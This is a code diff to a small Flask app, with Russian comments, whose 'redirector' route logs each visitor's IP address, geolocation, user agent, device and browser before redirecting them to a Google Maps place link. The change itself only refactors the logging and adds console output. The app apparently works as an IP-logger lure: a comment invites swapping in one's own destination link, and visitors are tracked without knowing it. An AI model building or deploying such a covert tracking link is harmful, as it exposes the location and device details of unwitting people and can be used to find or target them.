@@ -34,11 +34,12 @@ def index():
 def redirector():
     ip = request.headers.get("X-Forwarded-For", request.remote_addr)
     ua = ua_parse(request.headers.get("User-Agent", ""))
+    geo = geolocate(ip)
 
     log_entry = {
         "timestamp": datetime.utcnow().isoformat() + "Z",
         "ip": ip,
-        "geo": geolocate(ip),
+        "geo": geo,
         "user_agent": request.headers.get("User-Agent", ""),
         "device": {
             "family": ua.device.family,
@@ -49,10 +50,17 @@ def redirector():
         "browser": ua.browser.family + " " + ua.browser.version_string
     }
 
+    log_line = json.dumps(log_entry, ensure_ascii=False)
+    # Запись в файл
     with open(LOG_FILE, "a", encoding="utf-8") as f:
-        f.write(json.dumps(log_entry, ensure_ascii=False) + "\n")
+        f.write(log_line + "\n")
 
-    return redirect("https://www.google.com/maps/place/%D0%92%D0%B8%D0%BB%D0%BB%D0%B0...")
+    # Лог в консоль для отладки
+    print("[LOG ENTRY]", log_line)
+
+    # Редирект (можешь подставить свою ссылку)
+    return redirect("https://www.google.com/maps/place/%D0%92%D0%B8%D0%BB%D0%BB%D0%B0...")  
+
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
